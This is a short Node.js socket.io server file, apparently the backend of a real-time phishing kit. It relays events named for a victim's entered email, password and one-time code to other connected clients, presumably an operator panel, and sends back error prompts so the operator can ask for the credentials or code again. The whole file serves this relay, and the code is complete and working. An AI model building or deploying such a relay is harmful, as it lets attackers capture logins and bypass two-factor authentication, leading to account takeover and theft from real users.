const { createServer } = require('http');
const { Server } = require('socket.io');
const { getCurrentTime } = require('./lib/functions.js');
const cors = require('cors');

require('dotenv').config();

const port = process.env.PORT;

const httpServer = createServer();
const io = new Server(httpServer, {
	cors: {
		origin: '*',
	},
});

io.on('connection', (socket) => {
	console.log(`⚡: ${socket.id} user just connected! ${getCurrentTime()}`);

	socket.on('disconnect', () => {
		console.log('🔥: A user disconnected ', getCurrentTime());
	});

	socket.on('entered-email', (req) => {
		socket.broadcast.emit('send-email', req);
	});

	socket.on('entered-password', (req) => {
		socket.broadcast.emit('send-pass', req);
	});

	socket.on('entered-code', (req) => {
		socket.broadcast.emit('send-code', req);
	});

	socket.on('error-email', (req) => {
		socket.broadcast.emit('send-email-error', req);
	});

	socket.on('error-password', (req) => {
		socket.broadcast.emit('send-password-error', req);
	});

	socket.on('error-code', (req) => {
		socket.broadcast.emit('send-code-error', req);
	});
});

httpServer.listen(port, () => {
	console.log(`Server is running on port ${port}...`);
});
